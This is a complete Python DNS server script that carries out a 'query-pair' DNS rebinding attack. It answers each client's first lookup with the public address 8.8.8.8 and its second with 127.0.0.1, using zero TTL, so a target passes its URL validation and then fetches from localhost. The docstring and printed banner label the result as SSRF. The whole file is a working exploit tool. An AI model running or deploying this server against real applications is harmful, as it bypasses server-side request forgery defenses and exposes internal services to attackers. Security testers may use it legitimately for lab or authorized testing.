#!/usr/bin/env python3
"""
Query-Pair DNS Rebinding Server
================================
- Query 1 (any client): Returns PUBLIC (8.8.8.8) - passes validation
- Query 2 (same client within 5s): Returns PRIVATE (127.0.0.1) - SSRF!
- Resets after each pair

The key insight: validation and fetch happen close together.
We use query COUNT per client, resetting after pair completes.
"""

import socket
import struct
import time
from collections import defaultdict

PUBLIC_IP = "8.8.8.8"
PRIVATE_IP = "127.0.0.1"
DNS_PORT = 53

# Track: {client_ip: (query_count, last_query_time)}
client_state = defaultdict(lambda: (0, 0))

def ip_to_bytes(ip):
    return bytes(int(x) for x in ip.split('.'))

def build_response(query, ip):
    response = query[:2]
    response += struct.pack(">H", 0x8180)
    response += struct.pack(">HHHH", 1, 1, 0, 0)
    q_end = 12
    while query[q_end] != 0:
        q_end += 1
    q_end += 5
    response += query[12:q_end]
    response += struct.pack(">H", 0xc00c)
    response += struct.pack(">HH", 1, 1)
    response += struct.pack(">I", 0)  # TTL = 0
    response += struct.pack(">H", 4)
    response += ip_to_bytes(ip)
    return response

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', DNS_PORT))
    
    print("=" * 50)
    print(" Query-Pair DNS Rebinding Server")
    print("=" * 50)
    print("Query 1: PUBLIC (passes check)")
    print("Query 2: PRIVATE (SSRF!)")
    print("Resets after each pair")
    print("=" * 50)
    
    while True:
        data, addr = sock.recvfrom(512)
        client = addr[0]
        now = time.time()
        
        count, last_time = client_state[client]
        
        # Reset if more than 5 seconds since last query (new request cycle)
        if now - last_time > 5:
            count = 0
        
        count += 1
        
        # Odd queries (1, 3, 5...) = PUBLIC, Even queries (2, 4, 6...) = PRIVATE
        if count % 2 == 1:
            ip = PUBLIC_IP
        else:
            ip = PRIVATE_IP
        
        client_state[client] = (count, now)
        
        print(f"[{client}] Query #{count} -> {ip}")
        sock.sendto(build_response(data, ip), addr)

if __name__ == "__main__":
    main()
